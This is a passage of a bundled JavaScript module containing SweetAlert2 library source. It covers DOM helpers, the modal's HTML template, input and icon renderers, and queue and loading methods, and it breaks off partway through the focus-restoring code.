import {
  __export
} from "./chunk-OO5LXEG7.js";

// node_modules/sweetalert2/src/utils/utils.js
var consolePrefix = "SweetAlert2:";
var uniqueArray = (arr) => {
  const result = [];
  for (let i = 0; i < arr.length; i++) {
    if (result.indexOf(arr[i]) === -1) {
      result.push(arr[i]);
    }
  }
  return result;
};
var objectValues = (obj) => Object.keys(obj).map((key) => obj[key]);
var toArray = (nodeList) => Array.prototype.slice.call(nodeList);
var warn = (message) => {
  console.warn(`${consolePrefix} ${message}`);
};
var error = (message) => {
  console.error(`${consolePrefix} ${message}`);
};
var previousWarnOnceMessages = [];
var warnOnce = (message) => {
  if (!previousWarnOnceMessages.includes(message)) {
    previousWarnOnceMessages.push(message);
    warn(message);
  }
};
var warnAboutDepreation = (deprecatedParam, useInstead) => {
  warnOnce(`"${deprecatedParam}" is deprecated and will be removed in the next major release. Please use "${useInstead}" instead.`);
};
var callIfFunction = (arg) => typeof arg === "function" ? arg() : arg;
var isPromise = (arg) => arg && Promise.resolve(arg) === arg;

// node_modules/sweetalert2/src/utils/DismissReason.js
var DismissReason = Object.freeze({
  cancel: "cancel",
  backdrop: "backdrop",
  close: "close",
  esc: "esc",
  timer: "timer"
});

// node_modules/sweetalert2/src/staticMethods.js
var staticMethods_exports = {};
__export(staticMethods_exports, {
  argsToParams: () => argsToParams,
  clickCancel: () => clickCancel,
  clickConfirm: () => clickConfirm,
  deleteQueueStep: () => deleteQueueStep,
  enableLoading: () => showLoading,
  fire: () => fire,
  getActions: () => getActions,
  getCancelButton: () => getCancelButton,
  getCloseButton: () => getCloseButton,
  getConfirmButton: () => getConfirmButton,
  getContainer: () => getContainer,
  getContent: () => getContent,
  getFocusableElements: () => getFocusableElements,
  getFooter: () => getFooter,
  getHeader: () => getHeader,
  getIcon: () => getIcon,
  getIcons: () => getIcons,
  getImage: () => getImage,
  getPopup: () => getPopup,
  getQueueStep: () => getQueueStep,
  getTimerLeft: () => getTimerLeft,
  getTitle: () => getTitle,
  getValidationMessage: () => getValidationMessage,
  increaseTimer: () => increaseTimer,
  insertQueueStep: () => insertQueueStep,
  isDeprecatedParameter: () => isDeprecatedParameter,
  isLoading: () => isLoading,
  isTimerRunning: () => isTimerRunning,
  isUpdatableParameter: () => isUpdatableParameter,
  isValidParameter: () => isValidParameter,
  isVisible: () => isVisible2,
  mixin: () => mixin,
  queue: () => queue,
  resumeTimer: () => resumeTimer,
  showLoading: () => showLoading,
  stopTimer: () => stopTimer,
  toggleTimer: () => toggleTimer
});

// node_modules/sweetalert2/src/staticMethods/argsToParams.js
var argsToParams = (args) => {
  const params = {};
  switch (typeof args[0]) {
    case "object":
      Object.assign(params, args[0]);
      break;
    default:
      ["title", "html", "type"].forEach((name, index) => {
        switch (typeof args[index]) {
          case "string":
            params[name] = args[index];
            break;
          case "undefined":
            break;
          default:
            error(`Unexpected type of ${name}! Expected "string", got ${typeof args[index]}`);
        }
      });
  }
  return params;
};

// node_modules/sweetalert2/src/utils/classes.js
var swalPrefix = "swal2-";
var prefix = (items) => {
  const result = {};
  for (const i in items) {
    result[items[i]] = swalPrefix + items[i];
  }
  return result;
};
var swalClasses = prefix([
  "container",
  "shown",
  "height-auto",
  "iosfix",
  "popup",
  "modal",
  "no-backdrop",
  "toast",
  "toast-shown",
  "toast-column",
  "show",
  "hide",
  "noanimation",
  "close",
  "title",
  "header",
  "content",
  "actions",
  "confirm",
  "cancel",
  "footer",
  "icon",
  "image",
  "input",
  "file",
  "range",
  "select",
  "radio",
  "checkbox",
  "label",
  "textarea",
  "inputerror",
  "validation-message",
  "progress-steps",
  "active-progress-step",
  "progress-step",
  "progress-step-line",
  "loading",
  "styled",
  "top",
  "top-start",
  "top-end",
  "top-left",
  "top-right",
  "center",
  "center-start",
  "center-end",
  "center-left",
  "center-right",
  "bottom",
  "bottom-start",
  "bottom-end",
  "bottom-left",
  "bottom-right",
  "grow-row",
  "grow-column",
  "grow-fullscreen",
  "rtl"
]);
var iconTypes = prefix([
  "success",
  "warning",
  "info",
  "question",
  "error"
]);

// node_modules/sweetalert2/src/utils/dom/domUtils.js
var states = {
  previousBodyPadding: null
};
var hasClass = (elem, className) => {
  return elem.classList.contains(className);
};
var removeCustomClasses = (elem) => {
  toArray(elem.classList).forEach((className) => {
    if (!objectValues(swalClasses).includes(className) && !objectValues(iconTypes).includes(className)) {
      elem.classList.remove(className);
    }
  });
};
var applyCustomClass = (elem, customClass, className) => {
  removeCustomClasses(elem);
  if (customClass && customClass[className]) {
    if (typeof customClass[className] !== "string" && !customClass[className].forEach) {
      return warn(`Invalid type of customClass.${className}! Expected string or iterable object, got "${typeof customClass[className]}"`);
    }
    addClass(elem, customClass[className]);
  }
};
function getInput(content, inputType) {
  if (!inputType) {
    return null;
  }
  switch (inputType) {
    case "select":
    case "textarea":
    case "file":
      return getChildByClass(content, swalClasses[inputType]);
    case "checkbox":
      return content.querySelector(`.${swalClasses.checkbox} input`);
    case "radio":
      return content.querySelector(`.${swalClasses.radio} input:checked`) || content.querySelector(`.${swalClasses.radio} input:first-child`);
    case "range":
      return content.querySelector(`.${swalClasses.range} input`);
    default:
      return getChildByClass(content, swalClasses.input);
  }
}
var focusInput = (input) => {
  input.focus();
  if (input.type !== "file") {
    const val = input.value;
    input.value = "";
    input.value = val;
  }
};
var toggleClass = (target, classList, condition) => {
  if (!target || !classList) {
    return;
  }
  if (typeof classList === "string") {
    classList = classList.split(/\s+/).filter(Boolean);
  }
  classList.forEach((className) => {
    if (target.forEach) {
      target.forEach((elem) => {
        condition ? elem.classList.add(className) : elem.classList.remove(className);
      });
    } else {
      condition ? target.classList.add(className) : target.classList.remove(className);
    }
  });
};
var addClass = (target, classList) => {
  toggleClass(target, classList, true);
};
var removeClass = (target, classList) => {
  toggleClass(target, classList, false);
};
var getChildByClass = (elem, className) => {
  for (let i = 0; i < elem.childNodes.length; i++) {
    if (hasClass(elem.childNodes[i], className)) {
      return elem.childNodes[i];
    }
  }
};
var applyNumericalStyle = (elem, property, value) => {
  if (value || parseInt(value) === 0) {
    elem.style[property] = typeof value === "number" ? value + "px" : value;
  } else {
    elem.style.removeProperty(property);
  }
};
var show = (elem, display = "flex") => {
  elem.style.opacity = "";
  elem.style.display = display;
};
var hide = (elem) => {
  elem.style.opacity = "";
  elem.style.display = "none";
};
var toggle = (elem, condition, display) => {
  condition ? show(elem, display) : hide(elem);
};
var isVisible = (elem) => !!(elem && (elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length));
var isScrollable = (elem) => !!(elem.scrollHeight > elem.clientHeight);
var hasCssAnimation = (elem) => {
  const style = window.getComputedStyle(elem);
  const animDuration = parseFloat(style.getPropertyValue("animation-duration") || "0");
  const transDuration = parseFloat(style.getPropertyValue("transition-duration") || "0");
  return animDuration > 0 || transDuration > 0;
};
var contains = (haystack, needle) => {
  if (typeof haystack.contains === "function") {
    return haystack.contains(needle);
  }
};

// node_modules/sweetalert2/src/utils/dom/getters.js
var getContainer = () => document.body.querySelector("." + swalClasses.container);
var elementBySelector = (selectorString) => {
  const container = getContainer();
  return container ? container.querySelector(selectorString) : null;
};
var elementByClass = (className) => {
  return elementBySelector("." + className);
};
var getPopup = () => elementByClass(swalClasses.popup);
var getIcons = () => {
  const popup = getPopup();
  return toArray(popup.querySelectorAll("." + swalClasses.icon));
};
var getIcon = () => {
  const visibleIcon = getIcons().filter((icon) => isVisible(icon));
  return visibleIcon.length ? visibleIcon[0] : null;
};
var getTitle = () => elementByClass(swalClasses.title);
var getContent = () => elementByClass(swalClasses.content);
var getImage = () => elementByClass(swalClasses.image);
var getProgressSteps = () => elementByClass(swalClasses["progress-steps"]);
var getValidationMessage = () => elementByClass(swalClasses["validation-message"]);
var getConfirmButton = () => elementBySelector("." + swalClasses.actions + " ." + swalClasses.confirm);
var getCancelButton = () => elementBySelector("." + swalClasses.actions + " ." + swalClasses.cancel);
var getActions = () => elementByClass(swalClasses.actions);
var getHeader = () => elementByClass(swalClasses.header);
var getFooter = () => elementByClass(swalClasses.footer);
var getCloseButton = () => elementByClass(swalClasses.close);
var focusable = `
  a[href],
  area[href],
  input:not([disabled]),
  select:not([disabled]),
  textarea:not([disabled]),
  button:not([disabled]),
  iframe,
  object,
  embed,
  [tabindex="0"],
  [contenteditable],
  audio[controls],
  video[controls],
  summary
`;
var getFocusableElements = () => {
  const focusableElementsWithTabindex = toArray(getPopup().querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])')).sort((a, b) => {
    a = parseInt(a.getAttribute("tabindex"));
    b = parseInt(b.getAttribute("tabindex"));
    if (a > b) {
      return 1;
    } else if (a < b) {
      return -1;
    }
    return 0;
  });
  const otherFocusableElements = toArray(getPopup().querySelectorAll(focusable)).filter((el) => el.getAttribute("tabindex") !== "-1");
  return uniqueArray(focusableElementsWithTabindex.concat(otherFocusableElements)).filter((el) => isVisible(el));
};
var isModal = () => {
  return !isToast() && !document.body.classList.contains(swalClasses["no-backdrop"]);
};
var isToast = () => {
  return document.body.classList.contains(swalClasses["toast-shown"]);
};
var isLoading = () => {
  return getPopup().hasAttribute("data-loading");
};

// node_modules/sweetalert2/src/utils/isNodeEnv.js
var isNodeEnv = () => typeof window === "undefined" || typeof document === "undefined";

// node_modules/sweetalert2/src/utils/dom/init.js
var sweetHTML = `
 <div aria-labelledby="${swalClasses.title}" aria-describedby="${swalClasses.content}" class="${swalClasses.popup}" tabindex="-1">
   <div class="${swalClasses.header}">
     <ul class="${swalClasses["progress-steps"]}"></ul>
     <div class="${swalClasses.icon} ${iconTypes.error}">
       <span class="swal2-x-mark"><span class="swal2-x-mark-line-left"></span><span class="swal2-x-mark-line-right"></span></span>
     </div>
     <div class="${swalClasses.icon} ${iconTypes.question}"></div>
     <div class="${swalClasses.icon} ${iconTypes.warning}"></div>
     <div class="${swalClasses.icon} ${iconTypes.info}"></div>
     <div class="${swalClasses.icon} ${iconTypes.success}">
       <div class="swal2-success-circular-line-left"></div>
       <span class="swal2-success-line-tip"></span> <span class="swal2-success-line-long"></span>
       <div class="swal2-success-ring"></div> <div class="swal2-success-fix"></div>
       <div class="swal2-success-circular-line-right"></div>
     </div>
     <img class="${swalClasses.image}" />
     <h2 class="${swalClasses.title}" id="${swalClasses.title}"></h2>
     <button type="button" class="${swalClasses.close}"></button>
   </div>
   <div class="${swalClasses.content}">
     <div id="${swalClasses.content}"></div>
     <input class="${swalClasses.input}" />
     <input type="file" class="${swalClasses.file}" />
     <div class="${swalClasses.range}">
       <input type="range" />
       <output></output>
     </div>
     <select class="${swalClasses.select}"></select>
     <div class="${swalClasses.radio}"></div>
     <label for="${swalClasses.checkbox}" class="${swalClasses.checkbox}">
       <input type="checkbox" />
       <span class="${swalClasses.label}"></span>
     </label>
     <textarea class="${swalClasses.textarea}"></textarea>
     <div class="${swalClasses["validation-message"]}" id="${swalClasses["validation-message"]}"></div>
   </div>
   <div class="${swalClasses.actions}">
     <button type="button" class="${swalClasses.confirm}">OK</button>
     <button type="button" class="${swalClasses.cancel}">Cancel</button>
   </div>
   <div class="${swalClasses.footer}">
   </div>
 </div>
`.replace(/(^|\n)\s*/g, "");
var resetOldContainer = () => {
  const oldContainer = getContainer();
  if (!oldContainer) {
    return;
  }
  oldContainer.parentNode.removeChild(oldContainer);
  removeClass([document.documentElement, document.body], [
    swalClasses["no-backdrop"],
    swalClasses["toast-shown"],
    swalClasses["has-column"]
  ]);
};
var oldInputVal;
var resetValidationMessage = (e) => {
  if (sweetalert2_default.isVisible() && oldInputVal !== e.target.value) {
    sweetalert2_default.resetValidationMessage();
  }
  oldInputVal = e.target.value;
};
var addInputChangeListeners = () => {
  const content = getContent();
  const input = getChildByClass(content, swalClasses.input);
  const file = getChildByClass(content, swalClasses.file);
  const range = content.querySelector(`.${swalClasses.range} input`);
  const rangeOutput = content.querySelector(`.${swalClasses.range} output`);
  const select = getChildByClass(content, swalClasses.select);
  const checkbox = content.querySelector(`.${swalClasses.checkbox} input`);
  const textarea = getChildByClass(content, swalClasses.textarea);
  input.oninput = resetValidationMessage;
  file.onchange = resetValidationMessage;
  select.onchange = resetValidationMessage;
  checkbox.onchange = resetValidationMessage;
  textarea.oninput = resetValidationMessage;
  range.oninput = (e) => {
    resetValidationMessage(e);
    rangeOutput.value = range.value;
  };
  range.onchange = (e) => {
    resetValidationMessage(e);
    range.nextSibling.value = range.value;
  };
};
var getTarget = (target) => typeof target === "string" ? document.querySelector(target) : target;
var setupAccessibility = (params) => {
  const popup = getPopup();
  popup.setAttribute("role", params.toast ? "alert" : "dialog");
  popup.setAttribute("aria-live", params.toast ? "polite" : "assertive");
  if (!params.toast) {
    popup.setAttribute("aria-modal", "true");
  }
};
var setupRTL = (targetElement) => {
  if (window.getComputedStyle(targetElement).direction === "rtl") {
    addClass(getContainer(), swalClasses.rtl);
  }
};
var init = (params) => {
  resetOldContainer();
  if (isNodeEnv()) {
    error("SweetAlert2 requires document to initialize");
    return;
  }
  const container = document.createElement("div");
  container.className = swalClasses.container;
  container.innerHTML = sweetHTML;
  const targetElement = getTarget(params.target);
  targetElement.appendChild(container);
  setupAccessibility(params);
  setupRTL(targetElement);
  addInputChangeListeners();
};

// node_modules/sweetalert2/src/utils/dom/parseHtmlToContainer.js
var parseHtmlToContainer = (param, target) => {
  if (param instanceof HTMLElement) {
    target.appendChild(param);
  } else if (typeof param === "object") {
    handleJqueryElem(target, param);
  } else if (param) {
    target.innerHTML = param;
  }
};
var handleJqueryElem = (target, elem) => {
  target.innerHTML = "";
  if (0 in elem) {
    for (let i = 0; i in elem; i++) {
      target.appendChild(elem[i].cloneNode(true));
    }
  } else {
    target.appendChild(elem.cloneNode(true));
  }
};

// node_modules/sweetalert2/src/utils/dom/animationEndEvent.js
var animationEndEvent = (() => {
  if (isNodeEnv()) {
    return false;
  }
  const testEl = document.createElement("div");
  const transEndEventNames = {
    WebkitAnimation: "webkitAnimationEnd",
    OAnimation: "oAnimationEnd oanimationend",
    animation: "animationend"
  };
  for (const i in transEndEventNames) {
    if (Object.prototype.hasOwnProperty.call(transEndEventNames, i) && typeof testEl.style[i] !== "undefined") {
      return transEndEventNames[i];
    }
  }
  return false;
})();

// node_modules/sweetalert2/src/utils/dom/measureScrollbar.js
var measureScrollbar = () => {
  const supportsTouch = "ontouchstart" in window || navigator.msMaxTouchPoints;
  if (supportsTouch) {
    return 0;
  }
  const scrollDiv = document.createElement("div");
  scrollDiv.style.width = "50px";
  scrollDiv.style.height = "50px";
  scrollDiv.style.overflow = "scroll";
  document.body.appendChild(scrollDiv);
  const scrollbarWidth = scrollDiv.offsetWidth - scrollDiv.clientWidth;
  document.body.removeChild(scrollDiv);
  return scrollbarWidth;
};

// node_modules/sweetalert2/src/utils/dom/renderers/renderActions.js
var renderActions = (instance, params) => {
  const actions = getActions();
  const confirmButton = getConfirmButton();
  const cancelButton = getCancelButton();
  if (!params.showConfirmButton && !params.showCancelButton) {
    hide(actions);
  }
  applyCustomClass(actions, params.customClass, "actions");
  renderButton(confirmButton, "confirm", params);
  renderButton(cancelButton, "cancel", params);
  if (params.buttonsStyling) {
    handleButtonsStyling(confirmButton, cancelButton, params);
  } else {
    removeClass([confirmButton, cancelButton], swalClasses.styled);
    confirmButton.style.backgroundColor = confirmButton.style.borderLeftColor = confirmButton.style.borderRightColor = "";
    cancelButton.style.backgroundColor = cancelButton.style.borderLeftColor = cancelButton.style.borderRightColor = "";
  }
  if (params.reverseButtons) {
    confirmButton.parentNode.insertBefore(cancelButton, confirmButton);
  }
};
function handleButtonsStyling(confirmButton, cancelButton, params) {
  addClass([confirmButton, cancelButton], swalClasses.styled);
  if (params.confirmButtonColor) {
    confirmButton.style.backgroundColor = params.confirmButtonColor;
  }
  if (params.cancelButtonColor) {
    cancelButton.style.backgroundColor = params.cancelButtonColor;
  }
  const confirmButtonBackgroundColor = window.getComputedStyle(confirmButton).getPropertyValue("background-color");
  confirmButton.style.borderLeftColor = confirmButtonBackgroundColor;
  confirmButton.style.borderRightColor = confirmButtonBackgroundColor;
}
function renderButton(button, buttonType, params) {
  toggle(button, params["showC" + buttonType.substring(1) + "Button"], "inline-block");
  button.innerHTML = params[buttonType + "ButtonText"];
  button.setAttribute("aria-label", params[buttonType + "ButtonAriaLabel"]);
  button.className = swalClasses[buttonType];
  applyCustomClass(button, params.customClass, buttonType + "Button");
  addClass(button, params[buttonType + "ButtonClass"]);
}

// node_modules/sweetalert2/src/utils/dom/renderers/renderContainer.js
function handleBackdropParam(container, backdrop) {
  if (typeof backdrop === "string") {
    container.style.background = backdrop;
  } else if (!backdrop) {
    addClass([document.documentElement, document.body], swalClasses["no-backdrop"]);
  }
}
function handlePositionParam(container, position) {
  if (position in swalClasses) {
    addClass(container, swalClasses[position]);
  } else {
    warn('The "position" parameter is not valid, defaulting to "center"');
    addClass(container, swalClasses.center);
  }
}
function handleGrowParam(container, grow) {
  if (grow && typeof grow === "string") {
    const growClass = "grow-" + grow;
    if (growClass in swalClasses) {
      addClass(container, swalClasses[growClass]);
    }
  }
}
var renderContainer = (instance, params) => {
  const container = getContainer();
  if (!container) {
    return;
  }
  handleBackdropParam(container, params.backdrop);
  if (!params.backdrop && params.allowOutsideClick) {
    warn('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`');
  }
  handlePositionParam(container, params.position);
  handleGrowParam(container, params.grow);
  applyCustomClass(container, params.customClass, "container");
  if (params.customContainerClass) {
    addClass(container, params.customContainerClass);
  }
};

// node_modules/sweetalert2/src/privateProps.js
var privateProps_default = {
  promise: /* @__PURE__ */ new WeakMap(),
  innerParams: /* @__PURE__ */ new WeakMap(),
  domCache: /* @__PURE__ */ new WeakMap()
};

// node_modules/sweetalert2/src/utils/dom/renderers/renderInput.js
var inputTypes = ["input", "file", "range", "select", "radio", "checkbox", "textarea"];
var renderInput = (instance, params) => {
  const content = getContent();
  const innerParams = privateProps_default.innerParams.get(instance);
  const rerender = !innerParams || params.input !== innerParams.input;
  inputTypes.forEach((inputType) => {
    const inputClass = swalClasses[inputType];
    const inputContainer = getChildByClass(content, inputClass);
    setAttributes(inputType, params.inputAttributes);
    inputContainer.className = inputClass;
    if (rerender) {
      hide(inputContainer);
    }
  });
  if (params.input) {
    if (rerender) {
      showInput(params);
    }
    setCustomClass(params);
  }
};
var showInput = (params) => {
  if (!renderInputType[params.input]) {
    return error(`Unexpected type of input! Expected "text", "email", "password", "number", "tel", "select", "radio", "checkbox", "textarea", "file" or "url", got "${params.input}"`);
  }
  const inputContainer = getInputContainer(params.input);
  const input = renderInputType[params.input](inputContainer, params);
  show(input);
  setTimeout(() => {
    focusInput(input);
  });
};
var removeAttributes = (input) => {
  for (let i = 0; i < input.attributes.length; i++) {
    const attrName = input.attributes[i].name;
    if (!["type", "value", "style"].includes(attrName)) {
      input.removeAttribute(attrName);
    }
  }
};
var setAttributes = (inputType, inputAttributes) => {
  const input = getInput(getContent(), inputType);
  if (!input) {
    return;
  }
  removeAttributes(input);
  for (const attr in inputAttributes) {
    if (inputType === "range" && attr === "placeholder") {
      continue;
    }
    input.setAttribute(attr, inputAttributes[attr]);
  }
};
var setCustomClass = (params) => {
  const inputContainer = getInputContainer(params.input);
  if (params.inputClass) {
    addClass(inputContainer, params.inputClass);
  }
  if (params.customClass) {
    addClass(inputContainer, params.customClass.input);
  }
};
var setInputPlaceholder = (input, params) => {
  if (!input.placeholder || params.inputPlaceholder) {
    input.placeholder = params.inputPlaceholder;
  }
};
var getInputContainer = (inputType) => {
  const inputClass = swalClasses[inputType] ? swalClasses[inputType] : swalClasses.input;
  return getChildByClass(getContent(), inputClass);
};
var renderInputType = {};
renderInputType.text = renderInputType.email = renderInputType.password = renderInputType.number = renderInputType.tel = renderInputType.url = (input, params) => {
  if (typeof params.inputValue === "string" || typeof params.inputValue === "number") {
    input.value = params.inputValue;
  } else if (!isPromise(params.inputValue)) {
    warn(`Unexpected type of inputValue! Expected "string", "number" or "Promise", got "${typeof params.inputValue}"`);
  }
  setInputPlaceholder(input, params);
  input.type = params.input;
  return input;
};
renderInputType.file = (input, params) => {
  setInputPlaceholder(input, params);
  return input;
};
renderInputType.range = (range, params) => {
  const rangeInput = range.querySelector("input");
  const rangeOutput = range.querySelector("output");
  rangeInput.value = params.inputValue;
  rangeInput.type = params.input;
  rangeOutput.value = params.inputValue;
  return range;
};
renderInputType.select = (select, params) => {
  select.innerHTML = "";
  if (params.inputPlaceholder) {
    const placeholder = document.createElement("option");
    placeholder.innerHTML = params.inputPlaceholder;
    placeholder.value = "";
    placeholder.disabled = true;
    placeholder.selected = true;
    select.appendChild(placeholder);
  }
  return select;
};
renderInputType.radio = (radio) => {
  radio.innerHTML = "";
  return radio;
};
renderInputType.checkbox = (checkboxContainer, params) => {
  const checkbox = getInput(getContent(), "checkbox");
  checkbox.value = 1;
  checkbox.id = swalClasses.checkbox;
  checkbox.checked = Boolean(params.inputValue);
  const label = checkboxContainer.querySelector("span");
  label.innerHTML = params.inputPlaceholder;
  return checkboxContainer;
};
renderInputType.textarea = (textarea, params) => {
  textarea.value = params.inputValue;
  setInputPlaceholder(textarea, params);
  if ("MutationObserver" in window) {
    const initialPopupWidth = parseInt(window.getComputedStyle(getPopup()).width);
    const popupPadding = parseInt(window.getComputedStyle(getPopup()).paddingLeft) + parseInt(window.getComputedStyle(getPopup()).paddingRight);
    const outputsize = () => {
      const contentWidth = textarea.offsetWidth + popupPadding;
      if (contentWidth > initialPopupWidth) {
        getPopup().style.width = contentWidth + "px";
      } else {
        getPopup().style.width = null;
      }
    };
    new MutationObserver(outputsize).observe(textarea, {
      attributes: true,
      attributeFilter: ["style"]
    });
  }
  return textarea;
};

// node_modules/sweetalert2/src/utils/dom/renderers/renderContent.js
var renderContent = (instance, params) => {
  const content = getContent().querySelector("#" + swalClasses.content);
  if (params.html) {
    parseHtmlToContainer(params.html, content);
    show(content, "block");
  } else if (params.text) {
    content.textContent = params.text;
    show(content, "block");
  } else {
    hide(content);
  }
  renderInput(instance, params);
  applyCustomClass(getContent(), params.customClass, "content");
};

// node_modules/sweetalert2/src/utils/dom/renderers/renderFooter.js
var renderFooter = (instance, params) => {
  const footer = getFooter();
  toggle(footer, params.footer);
  if (params.footer) {
    parseHtmlToContainer(params.footer, footer);
  }
  applyCustomClass(footer, params.customClass, "footer");
};

// node_modules/sweetalert2/src/utils/dom/renderers/renderCloseButton.js
var renderCloseButton = (instance, params) => {
  const closeButton = getCloseButton();
  closeButton.innerHTML = params.closeButtonHtml;
  applyCustomClass(closeButton, params.customClass, "closeButton");
  toggle(closeButton, params.showCloseButton);
  closeButton.setAttribute("aria-label", params.closeButtonAriaLabel);
};

// node_modules/sweetalert2/src/utils/dom/renderers/renderIcon.js
var renderIcon = (instance, params) => {
  const innerParams = privateProps_default.innerParams.get(instance);
  if (innerParams && params.type === innerParams.type && getIcon()) {
    applyCustomClass(getIcon(), params.customClass, "icon");
    return;
  }
  hideAllIcons();
  if (!params.type) {
    return;
  }
  adjustSuccessIconBackgoundColor();
  if (Object.keys(iconTypes).indexOf(params.type) !== -1) {
    const icon = elementBySelector(`.${swalClasses.icon}.${iconTypes[params.type]}`);
    show(icon);
    applyCustomClass(icon, params.customClass, "icon");
    toggleClass(icon, `swal2-animate-${params.type}-icon`, params.animation);
  } else {
    error(`Unknown type! Expected "success", "error", "warning", "info" or "question", got "${params.type}"`);
  }
};
var hideAllIcons = () => {
  const icons = getIcons();
  for (let i = 0; i < icons.length; i++) {
    hide(icons[i]);
  }
};
var adjustSuccessIconBackgoundColor = () => {
  const popup = getPopup();
  const popupBackgroundColor = window.getComputedStyle(popup).getPropertyValue("background-color");
  const successIconParts = popup.querySelectorAll("[class^=swal2-success-circular-line], .swal2-success-fix");
  for (let i = 0; i < successIconParts.length; i++) {
    successIconParts[i].style.backgroundColor = popupBackgroundColor;
  }
};

// node_modules/sweetalert2/src/utils/dom/renderers/renderImage.js
var renderImage = (instance, params) => {
  const image = getImage();
  if (!params.imageUrl) {
    return hide(image);
  }
  show(image);
  image.setAttribute("src", params.imageUrl);
  image.setAttribute("alt", params.imageAlt);
  applyNumericalStyle(image, "width", params.imageWidth);
  applyNumericalStyle(image, "height", params.imageHeight);
  image.className = swalClasses.image;
  applyCustomClass(image, params.customClass, "image");
  if (params.imageClass) {
    addClass(image, params.imageClass);
  }
};

// node_modules/sweetalert2/src/utils/dom/renderers/renderProgressSteps.js
var createStepElement = (step) => {
  const stepEl = document.createElement("li");
  addClass(stepEl, swalClasses["progress-step"]);
  stepEl.innerHTML = step;
  return stepEl;
};
var createLineElement = (params) => {
  const lineEl = document.createElement("li");
  addClass(lineEl, swalClasses["progress-step-line"]);
  if (params.progressStepsDistance) {
    lineEl.style.width = params.progressStepsDistance;
  }
  return lineEl;
};
var renderProgressSteps = (instance, params) => {
  const progressStepsContainer = getProgressSteps();
  if (!params.progressSteps || params.progressSteps.length === 0) {
    return hide(progressStepsContainer);
  }
  show(progressStepsContainer);
  progressStepsContainer.innerHTML = "";
  const currentProgressStep = parseInt(params.currentProgressStep === null ? sweetalert2_default.getQueueStep() : params.currentProgressStep);
  if (currentProgressStep >= params.progressSteps.length) {
    warn("Invalid currentProgressStep parameter, it should be less than progressSteps.length (currentProgressStep like JS arrays starts from 0)");
  }
  params.progressSteps.forEach((step, index) => {
    const stepEl = createStepElement(step);
    progressStepsContainer.appendChild(stepEl);
    if (index === currentProgressStep) {
      addClass(stepEl, swalClasses["active-progress-step"]);
    }
    if (index !== params.progressSteps.length - 1) {
      const lineEl = createLineElement(step);
      progressStepsContainer.appendChild(lineEl);
    }
  });
};

// node_modules/sweetalert2/src/utils/dom/renderers/renderTitle.js
var renderTitle = (instance, params) => {
  const title = getTitle();
  toggle(title, params.title || params.titleText);
  if (params.title) {
    parseHtmlToContainer(params.title, title);
  }
  if (params.titleText) {
    title.innerText = params.titleText;
  }
  applyCustomClass(title, params.customClass, "title");
};

// node_modules/sweetalert2/src/utils/dom/renderers/renderHeader.js
var renderHeader = (instance, params) => {
  const header = getHeader();
  applyCustomClass(header, params.customClass, "header");
  renderProgressSteps(instance, params);
  renderIcon(instance, params);
  renderImage(instance, params);
  renderTitle(instance, params);
  renderCloseButton(instance, params);
};

// node_modules/sweetalert2/src/utils/dom/renderers/renderPopup.js
var renderPopup = (instance, params) => {
  const popup = getPopup();
  applyNumericalStyle(popup, "width", params.width);
  applyNumericalStyle(popup, "padding", params.padding);
  if (params.background) {
    popup.style.background = params.background;
  }
  popup.className = swalClasses.popup;
  if (params.toast) {
    addClass([document.documentElement, document.body], swalClasses["toast-shown"]);
    addClass(popup, swalClasses.toast);
  } else {
    addClass(popup, swalClasses.modal);
  }
  applyCustomClass(popup, params.customClass, "popup");
  if (typeof params.customClass === "string") {
    addClass(popup, params.customClass);
  }
  toggleClass(popup, swalClasses.noanimation, !params.animation);
};

// node_modules/sweetalert2/src/utils/dom/renderers/render.js
var render = (instance, params) => {
  renderPopup(instance, params);
  renderContainer(instance, params);
  renderHeader(instance, params);
  renderContent(instance, params);
  renderActions(instance, params);
  renderFooter(instance, params);
  if (typeof params.onRender === "function") {
    params.onRender(getPopup());
  }
};

// node_modules/sweetalert2/src/staticMethods/dom.js
var isVisible2 = () => {
  return isVisible(getPopup());
};
var clickConfirm = () => getConfirmButton() && getConfirmButton().click();
var clickCancel = () => getCancelButton() && getCancelButton().click();

// node_modules/sweetalert2/src/staticMethods/fire.js
function fire(...args) {
  const Swal2 = this;
  return new Swal2(...args);
}

// node_modules/sweetalert2/src/staticMethods/mixin.js
function mixin(mixinParams) {
  class MixinSwal extends this {
    _main(params) {
      return super._main(Object.assign({}, mixinParams, params));
    }
  }
  return MixinSwal;
}

// node_modules/sweetalert2/src/staticMethods/queue.js
var currentSteps = [];
var queue = function(steps) {
  const Swal2 = this;
  currentSteps = steps;
  const resetAndResolve = (resolve, value) => {
    currentSteps = [];
    document.body.removeAttribute("data-swal2-queue-step");
    resolve(value);
  };
  const queueResult = [];
  return new Promise((resolve) => {
    (function step(i, callback) {
      if (i < currentSteps.length) {
        document.body.setAttribute("data-swal2-queue-step", i);
        Swal2.fire(currentSteps[i]).then((result) => {
          if (typeof result.value !== "undefined") {
            queueResult.push(result.value);
            step(i + 1, callback);
          } else {
            resetAndResolve(resolve, { dismiss: result.dismiss });
          }
        });
      } else {
        resetAndResolve(resolve, { value: queueResult });
      }
    })(0);
  });
};
var getQueueStep = () => document.body.getAttribute("data-swal2-queue-step");
var insertQueueStep = (step, index) => {
  if (index && index < currentSteps.length) {
    return currentSteps.splice(index, 0, step);
  }
  return currentSteps.push(step);
};
var deleteQueueStep = (index) => {
  if (typeof currentSteps[index] !== "undefined") {
    currentSteps.splice(index, 1);
  }
};

// node_modules/sweetalert2/src/staticMethods/showLoading.js
var showLoading = () => {
  let popup = getPopup();
  if (!popup) {
    sweetalert2_default.fire("");
  }
  popup = getPopup();
  const actions = getActions();
  const confirmButton = getConfirmButton();
  const cancelButton = getCancelButton();
  show(actions);
  show(confirmButton);
  addClass([popup, actions], swalClasses.loading);
  confirmButton.disabled = true;
  cancelButton.disabled = true;
  popup.setAttribute("data-loading", true);
  popup.setAttribute("aria-busy", true);
  popup.focus();
};

// node_modules/sweetalert2/src/constants.js
var RESTORE_FOCUS_TIMEOUT = 100;

// node_modules/sweetalert2/src/globalState.js
var globalState = {};
var globalState_default = globalState;
var focusPreviousActiveElement = () => {
  if (globalState.previousActiveElement && globalState.previousActiveElement.focus) {
    globalState.previousActiveElement.focus();
    globalState.previousActiveElement = null;
  } else if (document.body) {
    document.body.focus();
  }
};
var restoreActiveElement = () => {
  return new Promise((resolve) => {
    const x = window.scrollX;
    const y = window.scrollY;
    globalState.restoreFocusTimeout = setTimeout(() => {
      focusPreviousActiveElement();
